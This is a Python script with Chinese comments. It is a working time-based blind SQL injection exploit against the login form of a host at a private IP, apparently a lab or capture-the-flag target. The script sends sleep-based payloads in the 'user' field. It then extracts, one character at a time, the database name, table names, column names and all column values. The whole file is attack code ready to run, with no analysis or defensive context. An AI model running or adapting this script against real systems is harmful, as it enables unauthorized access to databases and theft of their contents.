import requests
import string
import sys
 
# 所有可打印字符
all = string.printable
 
# 目标主机URL
url = "http://172.18.53.11/enter_network/"
 
headers = {"Content-Type":"application/x-www-form-urlencoded"}
 
 
# 获取数据库名
def extract_db_name():
    print("[+] Extracting db name")
    db_name = []
 
    # 判断数据库名长度
    for n in range(1,100):
        payload = {"user":"\' or (select if(length((select database()))=" + str(n) + ",sleep(3),1)) #", "pass":"1", "sub":"SEND"}
        r = requests.post(url, data=payload, headers=headers)
        if r.elapsed.total_seconds() > 3:
            db_name_len = n
            break
    print("[+] the length of db name: " + str(db_name_len))
 
    # 获取数据库名
    print("[+] the name of db: ", end='')
    for i in range(1, db_name_len + 1):
        for c in all:
            payload = {"user":"\' or (select if(ascii(substr((select database())," + str(i) + ",1))=" + str(ord(c)) + ",sleep(3),1)) #", "pass":"", "sub":"SEND"}
            r = requests.post(url, data = payload, headers = headers)
            if r.elapsed.total_seconds() > 3:
                db_name.append(c)
                if c == ",":
                    print("")
                    continue
                print(c, end='', flush=True)
    print("\n")
    return db_name
 
 
# 获取数据表的内容
def extract_tables(db_name):
    db_name = "".join(db_name)
    print("[+] Finding number of table in current db")
    table_name = []
 
    # 判断当前数据库中存在几张数据表
    for n in range(1, 50):
        payload = {"user":"\' or (select if((select count(table_name) from information_schema.tables where table_schema=\'" + db_name +"\')=" + str(n) + ",sleep(3),1)) #", "pass":"1", "sub":"SEND"}
        r = requests.post(url, data = payload, headers = headers)
        if r.elapsed.total_seconds() > 3:
            table_num = n
            break
    print("[+] Finding " + str(table_num) + " tables in current db")
 
    # 判断所有数据表名的长度
    print("[+] Finding the name of table in current db: ")
    for n in range(1, 100):
        payload = {"user":"\' or (select if(length((select group_concat(table_name) from information_schema.tables where table_schema=\'" + db_name + "\' limit 0,1))=" + str(n) + ",sleep(3),1))#", "pass":"1", "sub":"SEND"}
        r = requests.post(url, data = payload, headers = headers)
        if r.elapsed.total_seconds() > 3:
            table_name_len = n
            break
 
    # 获取当前数据库中所有的数据表
    for i in range(1, table_name_len + 1):
        for c in all:
            payload = {"user":"\' or (select if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\'" + db_name + "\' limit 0,1),"+ str(i) +",1))="+str(ord(c))+",sleep(3),1)) #", "pass":"1", "sub":"SEND"}
            r = requests.post(url, data = payload, headers = headers)
            if r.elapsed.total_seconds() > 3:
                table_name.append(c)
                if c == ",":
                    print("")
                    continue
                print(c, end="", flush=True)
    print("\n")
 
    # 是否继续获取列名
    column_name_inject = input("Show the name of column? [y/n]")
    if column_name_inject == "y" or column_name_inject == "yes":
        pass
    else:
        sys.exit()
 
 
    table_name = "".join(table_name)
    table_name = table_name.split(",")
 
    # 获取数据表中的具体内容
    for table in table_name:
        print("[+] Finding the column name of " + table)
        columns_name = []
 
        # 判断数据表中所有列名的长度
        for n in range(1, 100):
            payload = {"user":"\' or (select if(length((select group_concat(column_name) from information_schema.columns where table_name=\'" + table + "\' limit 0,1))= "+ str(n) + ",sleep(3),1)) #", "pass":"1", "sub":"SEND"}
            r = requests.post(url, data = payload, headers = headers)
            if r.elapsed.total_seconds() > 3:
                column_name_len = n
                break
 
      	# 获取数据表的列名
        for i in range(1, column_name_len + 1):
            for c in all:
                payload = {"user":"\' or (select if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\'"+ table + "\' limit 0,1)," + str(i) + ",1))=" + str(ord(c)) + ",sleep(3),1)) #", "pass":"1", "sub":"SEND"}
                r = requests.post(url, data = payload, headers = headers)
                if r.elapsed.total_seconds() > 3:
                    columns_name.append(c)
                    if c == ",":
                        print("")
                        continue
                    print(c, end="", flush=True)
        print("\n")
 
    	# 是否继续获取数据表中每列的值
        column_value_inject = input("Show the value of column? [y/n]:")
        if column_value_inject == "y" or column_value_inject == "yes":
            pass
        else:
            sys.exit()
 
        columns_name = "".join(columns_name)
        columns_name = columns_name.split(",")
 
        # 获取每列的内容
        for column in columns_name:
            column = "".join(column)
            print("[+] Finding the value of " + column)
            
            # 判断数据表所有列内容的长度
            for n in range(1, 1000):
                payload = {"user":"\' or (select if(length((select group_concat(" + column + ") from " + table + " limit 0,1))= "+ str(n) + ",sleep(3),1)) #","pass":"1","sub":"SEND"}
                r = requests.post(url, data = payload, headers = headers)
                if r.elapsed.total_seconds() > 3:
                    columns_values_len = n
                    break
            # 获取数据表中每列的值
            for i in range(1, columns_values_len + 1):
                for c in all:
                    payload = {"user":"\' or (select if(ascii(substr((select group_concat(" + column + ") from " + table + " limit 0,1)," + str(i) + ",1))=" + str(ord(c)) + ",sleep(3),1)) #","pass":"1","sub":"SEND"}
                    r = requests.post(url, data = payload, headers = headers)
                    if r.elapsed.total_seconds() > 3:
                        if c == ",":
                            print("")
                            continue
                        print(c, end="", flush=True)
            print("")
 
 
try:
    db_name = extract_db_name()		# 获取当前数据库名
    user_input = input("Show the name of table? [y/n]:")	# 是否继续获取表名
    if user_input == "y" or user_input == "yes":
        extract_tables(db_name)
    else:
        sys.exit()
    print("Done!")
except KeyboardInterrupt:
    print("")
    print("[+] Exiting...")
    sys.exit()